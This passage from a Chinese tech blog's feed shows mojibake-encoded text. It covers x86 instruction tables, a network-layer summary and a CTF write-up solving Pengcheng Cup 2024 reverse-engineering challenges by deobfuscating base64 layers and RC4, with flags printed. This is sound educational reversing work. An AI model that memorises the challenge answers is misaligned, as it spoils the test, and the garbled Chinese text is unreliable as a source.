<strong>ptr16:32</strong></td><td>ç»å¯¹è¿œè°ƒç”¨ï¼Œåœ°å€ç”±æ“ä½œæ•°ç»™å‡º</td></tr><tr><td>FF /3</td><td>CALL <strong>m16:16</strong></td><td>ç»å¯¹é—´æ¥è¿œè°ƒç”¨ï¼Œåœ°å€ç”± <strong>m16:16</strong> ç»™å‡º</td></tr><tr><td>FF /3</td><td>CALL <strong>m16:32</strong></td><td>ç»å¯¹é—´æ¥è¿œè°ƒç”¨ï¼Œåœ°å€ç”± <strong>m16:32</strong> ç»™å‡º</td></tr></tbody></table><table><thead><tr><th>æ“ä½œç </th><th>æŒ‡ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>C3</td><td>RET</td><td>è¿‘è¿”å›åˆ°è°ƒç”¨è¿‡ç¨‹</td></tr><tr><td>CB</td><td>RET</td><td>è¿œè¿”å›åˆ°è°ƒç”¨è¿‡ç¨‹</td></tr><tr><td>C2 <strong>iw</strong></td><td>RET <strong>imm16</strong></td><td>è¿‘è¿”å›åˆ°è°ƒç”¨è¿‡ç¨‹ï¼Œå¹¶ä»å †æ ˆå¼¹å‡º <strong>imm16</strong> ä¸ªå­—èŠ‚</td></tr><tr><td>CA <strong>iw</strong></td><td>RET <strong>imm16</strong></td><td>è¿œè¿”å›åˆ°è°ƒç”¨è¿‡ç¨‹ï¼Œå¹¶ä»å †æ ˆå¼¹å‡º <strong>imm16</strong> ä¸ªå­—èŠ‚</td></tr></tbody></table><p>retfæŒ‡ä»¤ï¼šå…ˆå¼¹å‡ºå€¼åˆ°IPå¯„å­˜å™¨ï¼Œå†å¼¹å‡ºå€¼åˆ°CSæ®µå¯„å­˜å™¨å®ç°è¿”å›ã€‚</p><h2 id="å¾ªç¯æŒ‡ä»¤">å¾ªç¯æŒ‡ä»¤</h2><table><thead><tr><th>æ“ä½œç </th><th>æŒ‡ä»¤</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>E2 <strong>cb</strong></td><td>LOOP <strong>rel8</strong></td><td>é€’å‡è®¡æ•°ï¼›è®¡æ•°  $\not =$ 0 æ—¶çŸ­è·³è½¬</td></tr><tr><td>E1 <strong>cb</strong></td><td>LOOPE <strong>rel8</strong></td><td>é€’å‡è®¡æ•°ï¼›è®¡æ•°  $\not =$  0 ä¸” ZF=1 æ—¶çŸ­è·³è½¬</td></tr><tr><td>E1 <strong>cb</strong></td><td>LOOPZ <strong>rel8</strong></td><td>é€’å‡è®¡æ•°ï¼›è®¡æ•°  $\not =$  0 ä¸” ZF=1 æ—¶çŸ­è·³è½¬</td></tr><tr><td>E0 <strong>cb</strong></td><td>LOOPNE <strong>rel8</strong></td><td>é€’å‡è®¡æ•°ï¼›è®¡æ•°  $\not =$  0 ä¸” ZF=0 æ—¶çŸ­è·³è½¬</td></tr><tr><td>E0 <strong>cb</strong></td><td>LOOPNZ <strong>rel8</strong></td><td>é€’å‡è®¡æ•°ï¼›è®¡æ•°  $\not =$  0 ä¸” ZF=0 æ—¶çŸ­è·³è½¬</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> é€†å‘ </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ±‡ç¼– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>äº”å±‚ç½‘ç»œåè®®å°æ€»ç»“</title>
      <link href="/posts/f8da60a2.html"/>
      <url>/posts/f8da60a2.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç†è®ºäº”å±‚æ¨¡å‹">ç†è®ºäº”å±‚æ¨¡å‹</h2><p>åˆ†ä¸ºï¼š<br>åº”ç”¨å±‚ï¼Œä¼ è¾“å±‚ï¼Œç½‘ç»œå±‚ï¼Œæ•°æ®é“¾è·¯å±‚ï¼Œç‰©ç†å±‚</p><p>æ¯ä¸€å±‚éƒ½è´Ÿè´£äº†ä¸€éƒ¨åˆ†å†…å®¹å¹¶ç»™ä¸Šä¸€å±‚æ‰“ä¸‹åŸºç¡€</p><p>åè®®ï¼šæ¯ä¸€å±‚é€šè¿‡æ”¯æŒå¯¹åº”çš„åè®®æ¥å®ç°æœ¬å±‚çš„åŠŸèƒ½ï¼Œä¸¤ä¸ªæœºå™¨åœ¨åŒä¸€å±‚å¦‚æœä¸æ”¯æŒç›¸åŒçš„åè®®ï¼Œå°±ä¸èƒ½æ­£å¸¸é€šä¿¡ã€‚</p><h3 id="ç‰©ç†å±‚">ç‰©ç†å±‚</h3><p>ä½œç”¨ï¼šå®ç°ä¼ è¾“æ¯”ç‰¹ä¿¡å·ï¼Œéœ€è¦å®ç°01æ¨¡æ‹Ÿä¿¡å·å’Œå…¶å®ƒä¿¡å·ä¹‹é—´çš„è½¬æ¢</p><p>ç‰©ç†å®ç°ï¼šä¸­ç»§å™¨ï¼Œé›†çº¿å™¨</p><p>å¯¹åº”åè®®ï¼šç½‘çº¿ï¼Œå…‰çº¤ç­‰çš„æ¥å£ç±»å‹ï¼Œä¼ è¾“ä»‹è´¨çš„é€Ÿç‡æ ‡å‡†ç­‰</p><p>æµç¨‹ï¼šä»æ¨¡æ‹Ÿä¿¡å·è½¬ä¸ºå…¶å®ƒä¿¡å·åï¼Œé€šè¿‡ç‰©ç†è·¯å¾„ï¼ˆå¼•å¯¼/éå¼•å¯¼ï¼‰åˆ°çº¿è·¯ç»ˆç‚¹å†è¢«è½¬ä¸ºæ¨¡æ‹Ÿä¿¡å·</p><p>å…¶å®ƒæ³¨æ„ç‚¹ï¼šå¤ç”¨æŠ€æœ¯ï¼ˆç åˆ†å¤šå€ï¼‰ï¼ŒXå·¥é€šä¿¡</p><h3 id="æ•°æ®é“¾è·¯å±‚">æ•°æ®é“¾è·¯å±‚</h3><p>ä½œç”¨ï¼šå®ç°å¸§çš„ä¼ è¾“ï¼Œå¯¹äºä¸Šå±‚æ•°æ®çš„é€æ˜ä¼ è¾“ï¼ˆå¯¹ä¸Šå±‚ä¸å¯è§ï¼‰ï¼Œä¸€å®šçš„å·®é”™æ£€æŸ¥ã€‚</p><p>ç‰©ç†å®ç°ï¼šç½‘å¡ï¼ˆMACåœ°å€ï¼‰ï¼Œäº¤æ¢æœº</p><p>å¯¹åº”åè®®ï¼šPPPåè®®å’Œä»¥å¤ªç½‘åè®®ï¼ˆå®ç°å°è£…æˆå¸§ï¼Œé€æ˜ä¼ è¾“å’Œå·®é”™æ£€æŸ¥ï¼‰</p><p>æµç¨‹ï¼šå¯¹äºä¸€æ®µé“¾è·¯ï¼Œå…ˆå°†ç½‘ç»œå±‚ä¸‹äº¤çš„æ•°æ®å°è£…æˆMACå¸§ï¼Œé€šè¿‡å¯¹åº”çš„åè®®å»ä¼ è¾“å¸§ï¼Œäº¤æ¢æœºç»´æŠ¤äº†ä¸€å¼ <code>è½¬å‘è¡¨</code>ï¼Œåœ¨è¿™é‡Œæ‰¾åˆ°ç›®çš„MACåœ°å€åè½¬å‘ç»™å¯¹åº”çš„ç«¯å£ï¼Œç„¶åäº¤ç»™ç‰©ç†å±‚ã€‚å¦‚æœæ˜¯ä¸»æœºå‘é€ï¼Œåˆ™ç›´æ¥å‘ç»™è¿æ¥çš„äº¤æ¢æœºã€‚</p><h3 id="ç½‘ç»œå±‚">ç½‘ç»œå±‚</h3><p>ä½œç”¨ï¼šå®ç°IPæ•°æ®æŠ¥çš„ä¼ è¾“ï¼Œé€‰æ‹©åˆé€‚çš„è·¯çº¿ä¼ é€æ•°æ®ã€‚æ˜¯éä¸»æœºçš„è®¾å¤‡çš„æœ€é«˜å±‚</p><p>ç‰©ç†å®ç°ï¼šè·¯ç”±å™¨</p><p>å¯¹åº”åè®®ï¼šIPåè®®ï¼Œä»¥åŠå®ƒéœ€è¦çš„ARPåœ°å€è§£æåè®®å’Œåœ¨å®ƒä¹‹ä¸Šçš„ICMPæŠ¥æ–‡æ§åˆ¶åè®®å’ŒIGMPç»„ç®¡ç†åè®®ã€‚</p><p>æµç¨‹ï¼šå¯¹äºä¼ è¾“å±‚çš„æ•°æ®ï¼Œå…ˆè½¬ä¸ºå¯¹åº”çš„IPæ•°æ®æŠ¥ï¼Œä»ä¸Šå±‚å¾—åˆ°çš„å¥—æ¥å­—ä¸­æœ‰ç›®çš„IPåœ°å€ï¼Œé€šè¿‡è·¯ç”±å™¨ä¸­çš„è·¯ç”±é€‰æ‹©åè®®ï¼ˆRIPï¼ŒOSPFï¼ŒBGPï¼‰æ›´æ–°è‡ªå·±çš„<code>è·¯ç”±è¡¨</code>ï¼Œé€šè¿‡è·¯ç”±è¡¨æ‰¾åˆ°å¯¹åº”çš„IPåœ°å€ï¼Œç„¶åè½¬å‘ç»™å¯¹åº”çš„ç«¯å£ï¼Œè½¬å‘å‰ï¼Œé€šè¿‡ARPåè®®å–IPå¯¹åº”çš„MACåœ°å€ï¼Œå…ˆå°†MACå¸§ä¸­çš„æºMACåœ°å€æ”¹ä¸ºè¿™ä¸ªç«¯å£çš„åœ°å€ï¼Œå°†ç›®çš„MACåœ°å€è½¬ä¸ºä¸‹ä¸€è·³è®¾å¤‡çš„MACåœ°å€ã€‚ç„¶åå‘ç»™æ•°æ®é“¾è·¯å±‚</p><h3 id="ä¼ è¾“å±‚">ä¼ è¾“å±‚</h3><p>ä½œç”¨ï¼šå‘åº”ç”¨å±‚æä¾›æœåŠ¡ï¼Œå®ç°è¿›ç¨‹é—´çš„é€šä¿¡ã€‚å¤ç”¨å’Œåˆ†ç”¨ã€‚å¯ä¿¡ä¼ è¾“ï¼Œå·®é”™æ£€æŸ¥ï¼Œæµé‡æ§åˆ¶ï¼Œæ‹¥å¡æ§åˆ¶ç­‰</p><p>ç‰©ç†å®ç°ï¼šä¸»æœº</p><p>å¯¹åº”åè®®ï¼šTCP/UDPï¼Œä¸€ä¸ªæ˜¯é¢å‘è¿æ¥çš„ï¼Œæ•°æ®ä¼ è¾“çš„å•ä½æ˜¯æŠ¥æ–‡æ®µï¼Œèƒ½å¤Ÿæä¾›å¯é çš„äº¤ä»˜ã€‚ ä¸€ä¸ªæ˜¯æ— è¿æ¥çš„ï¼Œæ•°æ®ä¼ è¾“çš„å•ä½æ˜¯ç”¨æˆ·æ•°æ®æŠ¥ï¼Œä¸ä¿è¯æä¾›å¯é çš„äº¤ä»˜ï¼Œåªèƒ½æä¾›â€œå°½æœ€å¤§åŠªåŠ›äº¤ä»˜â€ã€‚</p><p>æµç¨‹ï¼šå‘é€çš„æƒ…å†µï¼šæ ¹æ®ä¸åŒçš„åè®®è¦æ±‚ï¼Œç„¶åè½¬ä¸ºTCP/UDPå¤´éƒ¨ä¿¡æ¯ã€‚ç›´æ¥ç»™ä¸‹ä¸€å±‚ã€‚å¦‚æœæ˜¯TCPä¼šæœ‰ä¸‰æ¬¡äº¤æ¢æ•°æ®è¯·æ±‚è¿æ¥ç­‰è¿™ç§æœ¬å±‚å¤„ç†çš„äº‹é¡¹ã€‚æ¥æ”¶çš„æƒ…å†µï¼šæ”¶åˆ°åæ‹¼æ¥ï¼Œç„¶åå‘ä¸Šå‘ç»™åº”ç”¨å±‚ã€‚</p><h3 id="åº”ç”¨å±‚">åº”ç”¨å±‚</h3><p>ä½œç”¨ï¼šå®ç°éœ€è¦çš„åŠŸèƒ½</p><p>ç‰©ç†å®ç°ï¼šæ— </p><p>å¯¹åº”åè®®ï¼šå¾ˆå¤šï¼Œæ¯”å¦‚ï¼šDNSï¼Œhttpç­‰</p><p>æµç¨‹ï¼šå¯¹åº”ä¸åŒå®ç°æœ‰ä¸åŒæµç¨‹</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†é›† </category>
          
          <category> å¼€å‘ </category>
          
          <category> ç½‘ç»œç¼–ç¨‹ </category>
          
          <category> è®¡ç®—æœºç½‘ç»œ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é¹åŸæ¯2024-re-å¤ç°</title>
      <link href="/posts/674d40c7.html"/>
      <url>/posts/674d40c7.html</url>
      
        <content type="html"><![CDATA[<h2 id="RE">RE</h2><h3 id="chall-py">chall_py</h3><p>å‘ç°å…¨æ˜¯baseï¼Œç”¨è§£å¯†è„šæœ¬è§£å¯†ä¸ºä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> prism <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">strr = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&#x27;./chall.py&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    strr = f.read()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&quot;&quot;&quot;\s*(.*?)\s*&quot;&quot;&quot;&#x27;</span>, re.DOTALL) </span><br><span class="line">    matches = pattern.findall(strr.decode())</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;b32decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b32decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;b64decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b64decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;b85decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = b85decode(matches[<span class="number">0</span>])    </span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b&#x27;a85decode&#x27;</span> <span class="keyword">in</span> strr:</span><br><span class="line">        strr = a85decode(matches[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./res.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(strr)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="literal">True</span></span><br><span class="line">d=<span class="built_in">len</span></span><br><span class="line">G=<span class="built_in">list</span></span><br><span class="line">g=<span class="built_in">range</span></span><br><span class="line">s=<span class="built_in">next</span></span><br><span class="line">R=<span class="built_in">bytes</span></span><br><span class="line">o=<span class="built_in">input</span></span><br><span class="line">Y=<span class="built_in">print</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">l</span>(<span class="params">S</span>):</span><br><span class="line"> i=<span class="number">0</span></span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">while</span> a:</span><br><span class="line">  i=(i+<span class="number">1</span>)%<span class="number">256</span></span><br><span class="line">  j=(j+S[i])%<span class="number">256</span></span><br><span class="line">  S[i],S[j]=S[j],S[i]</span><br><span class="line">  K=S[(S[i]+S[j])%<span class="number">256</span>]</span><br><span class="line">  <span class="keyword">yield</span> K</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">N</span>(<span class="params">key,O</span>):</span><br><span class="line"> I=d(key)</span><br><span class="line"> S=G(g(<span class="number">256</span>))</span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> g(<span class="number">256</span>):</span><br><span class="line">  j=(j+S[i]+key[i%I])%<span class="number">256</span></span><br><span class="line">  S[i],S[j]=S[j],S[i]</span><br><span class="line"> z=l(S)</span><br><span class="line"> n=[]</span><br><span class="line"> <span class="keyword">for</span> k <span class="keyword">in</span> O:</span><br><span class="line">  n.append(k^s(z)+<span class="number">2</span>)</span><br><span class="line"> <span class="keyword">return</span> R(n)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>(<span class="params">s,parts_num</span>):</span><br><span class="line"> Q=d(s.decode())</span><br><span class="line"> S=Q//parts_num</span><br><span class="line"> u=Q%parts_num</span><br><span class="line"> W=[]</span><br><span class="line"> j=<span class="number">0</span></span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> g(parts_num):</span><br><span class="line">  T=j+S</span><br><span class="line">  <span class="keyword">if</span> u&gt;<span class="number">0</span>:</span><br><span class="line">   T+=<span class="number">1</span></span><br><span class="line">   u-=<span class="number">1</span></span><br><span class="line">  W.append(s[j:T])</span><br><span class="line">  j=T</span><br><span class="line"> <span class="keyword">return</span> W</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> L=o(<span class="string">&#x27;input the flag: &gt;&gt;&gt; &#x27;</span>).encode()</span><br><span class="line"> <span class="keyword">assert</span> d(L)%<span class="number">2</span>==<span class="number">0</span>,<span class="string">&#x27;flag length should be even&#x27;</span></span><br><span class="line"> t=<span class="string">b&#x27;v3ry_s3cr3t_p@ssw0rd&#x27;</span></span><br><span class="line"> O=E(L,<span class="number">2</span>)</span><br><span class="line"> U=[]</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> O:</span><br><span class="line">  U.append(N(t,i).<span class="built_in">hex</span>())</span><br><span class="line"> <span class="keyword">if</span> U==[<span class="string">&#x27;1796972c348bc4fe7a1930b833ff10a80ab281627731ab705dacacfef2e2804d74ab6bc19f60&#x27;</span>,2ea999141a8cc9e47975269340c177c726a8aa732953a66a6af183bcd9cec8464a<span class="string">&#x27;]:</span></span><br><span class="line"><span class="string">  Y(&#x27;</span>Congratulations! You got the flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"> else:</span></span><br><span class="line"><span class="string">  Y(&#x27;</span>Wrong flag!<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2024/11/09/DmEqGt8dscFrKgQ.png" alt="image-20241109172858511"></p><p>å‘ç°è¿™é‡Œå°‘äº†ä¸€ä¸ª\â€˜,è¡¥ä¸Š,ç„¶åçœ‹çœ‹æ„Ÿè§‰æ˜¯RC4ï¼Œæ‰€ä»¥ç›´æ¥æŠŠç»“æœåœ¨è°ƒè¯•çš„æ—¶å€™ç²˜è´´è¿›å»è§£å‡ºæ¥å¾—åˆ°</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">666</span><span class="keyword">c</span><span class="number">61677</span>b<span class="number">7468456e5</span>f<span class="number">495</span>f<span class="number">4361355</span>f<span class="number">42455</span>f<span class="number">596</span>f<span class="number">55525</span>f<span class="number">4</span>f<span class="number">6e6</span><span class="keyword">c</span><span class="number">375</span>f<span class="number">45786543557469366e5</span>f<span class="number">536</span>f<span class="number">5</span>f<span class="number">5573655</span>f<span class="number">6</span>d<span class="number">335</span>f<span class="number">74305</span>f<span class="number">52306e5</span>f<span class="number">744831375</span>f<span class="number">45783343757469306e7</span>d</span><br></pre></td></tr></table></figure><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;thEn_I_Ca5_BE_YoUR_Onl7_ExeCUti6n_So_Use_m3_t0_R0n_tH17_Ex3Cuti0n&#125;</span></span><br></pre></td></tr></table></figure><h3 id="joyVBS">joyVBS</h3><p>å’Œä¸Šä¸€ä¸ªé¢˜çš„æ€è·¯</p><p>å¼€å¤´æ·»åŠ </p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim fso, <span class="keyword">file</span></span><br><span class="line"><span class="keyword">Set</span> fso = CreateObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>)</span><br><span class="line"><span class="keyword">Set</span> <span class="keyword">file</span> = fso.CreateTextFile(<span class="string">&quot;output.txt&quot;</span>, <span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>æ”¹ä¸ºfile.Write</p><p>å¾—åˆ°æ–‡ä»¶</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">MsgBox <span class="string">&quot;VBScript, often abbreviated as VBS, is an event-driven programming language developed by Microsoft, primarily used for scripting in the Windows environment.&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;It is based on the Visual Basic programming language and is designed to be simple and easy to use, especially for those familiar with the BASIC programming language.&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;And for me, it is the first programming language that I&#x27;ve leart&quot;</span></span><br><span class="line">MsgBox <span class="string">&quot;Hackers! Have fun with this VBS challenge!&quot;</span></span><br><span class="line">flag = <span class="built_in">InputBox</span>(<span class="string">&quot;Enter the FLAG:&quot;</span>, <span class="string">&quot;Hack for fun&quot;</span>)</span><br><span class="line">wefbuwiue = <span class="string">&quot;NalvN3hKExBtALBtInPtNHTnKJ80L3JtqxTboRA/MbF3LnT0L2zHL2SlqnPtJLAnFbIlL2SnFT8lpzFzA2JHrRTiNmT9&quot;</span></span><br><span class="line"></span><br><span class="line">qwfe = <span class="number">9</span>+<span class="number">2</span>+<span class="number">2</span>+<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Function</span> Base64Decode(base64EncodedString)</span><br><span class="line">    <span class="keyword">Dim</span> xml, elem</span><br><span class="line">    <span class="keyword">Set</span> xml = <span class="built_in">CreateObject</span>(<span class="string">&quot;MSXML2.DOMDocument&quot;</span>)</span><br><span class="line">    <span class="keyword">Set</span> elem = xml.createElement(<span class="string">&quot;tmp&quot;</span>)</span><br><span class="line">    elem.dataType = <span class="string">&quot;bin.base64&quot;</span> </span><br><span class="line">    elem.text = base64EncodedString </span><br><span class="line">    <span class="keyword">Dim</span> stream</span><br><span class="line">    <span class="keyword">Set</span> stream = <span class="built_in">CreateObject</span>(<span class="string">&quot;ADODB.Stream&quot;</span>)</span><br><span class="line">    stream.Type = <span class="number">1</span> <span class="comment">&#x27;Binary</span></span><br><span class="line">    stream.Open</span><br><span class="line">    stream.Write elem.nodeTypedValue </span><br><span class="line">    stream.Position = <span class="number">0</span></span><br><span class="line">    stream.Type = <span class="number">2</span> <span class="comment">&#x27;Text</span></span><br><span class="line">    stream.Charset = <span class="string">&quot;utf-8&quot;</span></span><br><span class="line">    Base64Decode = stream.ReadText</span><br><span class="line">    stream.Close</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"><span class="keyword">Function</span> Caesar(str,offset)</span><br><span class="line"><span class="keyword">Dim</span> length,char,i</span><br><span class="line">Caesar = <span class="string">&quot;&quot;</span></span><br><span class="line">length = <span class="built_in">Len</span>(str)</span><br><span class="line"><span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> length</span><br><span class="line">char = <span class="built_in">Mid</span>(str,i,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">If</span> char &gt;= <span class="string">&quot;A&quot;</span> <span class="keyword">And</span> char &lt;= <span class="string">&quot;Z&quot;</span> <span class="keyword">Then</span></span><br><span class="line">char = <span class="built_in">Asc</span>(<span class="string">&quot;A&quot;</span>) + (<span class="built_in">Asc</span>(char) - <span class="built_in">Asc</span>(<span class="string">&quot;A&quot;</span>) + offset) Mod <span class="number">26</span></span><br><span class="line">Caesar = Caesar &amp; <span class="built_in">Chr</span>(char)</span><br><span class="line"><span class="keyword">ElseIf</span> char &gt;= <span class="string">&quot;a&quot;</span> <span class="keyword">And</span> char &lt;= <span class="string">&quot;z&quot;</span> <span class="keyword">Then</span></span><br><span class="line">char = <span class="built_in">Asc</span>(<span class="string">&quot;a&quot;</span>) + (<span class="built_in">Asc</span>(char) - <span class="built_in">Asc</span>(<span class="string">&quot;a&quot;</span>) + offset) Mod <span class="number">26</span></span><br><span class="line">Caesar = Caesar &amp; <span class="built_in">Chr</span>(char)</span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">Caesar = Caesar &amp; char</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">If</span> flag = Base64Decode(Caesar(wefbuwiue, <span class="number">26</span>-qwfe)) <span class="keyword">Then</span></span><br><span class="line">    MsgBox <span class="string">&quot;Congratulations! Correct  FLAG!&quot;</span></span><br><span class="line"><span class="keyword">Else</span></span><br><span class="line">    MsgBox <span class="string">&quot;Wrong flag.&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br></pre></td></tr></table></figure><p>å°è¯•ç›´æ¥è¾“å‡ºBase64Decode</p><p><img src="https://s2.loli.net/2024/11/09/6BCL3jP7U4QIdNV.png" alt="image-20241109173144980"></p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml">flag</span><span class="template-variable">&#123;VB3_1s_S0_e1sY_4_u_r1gh3?btw_1t_iS_a1s0_Us3Fu1_a3D_1nTe3eSt1ng!&#125;</span></span><br></pre></td></tr></table></figure><h3 id="re5">re5</h3><p>è°ƒè¯•å¯ä»¥çœ‹å‡ºï¼Œæ¯æ¬¡çš„SEHéƒ½ä½¿ç”¨rand()ä¿®æ”¹äº†deltaï¼Œ</p><p><img src="https://s2.loli.net/2024/11/09/owkBQxFVCJLnyUp.png" alt="image-20241109173349124"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°srandåˆå§‹åŒ–æ˜¯0ï¼Œé‚£ä¹ˆç›´æ¥è¾“å‡ºæ¯æ¬¡çš„deltaå³å¯ï¼ŒåŒæ—¶keyä¸æ˜¯1234è€Œæ˜¯2233å¾ˆæ€ªä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>ç„¶åç›´æ¥å†™è„šæœ¬è§£å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 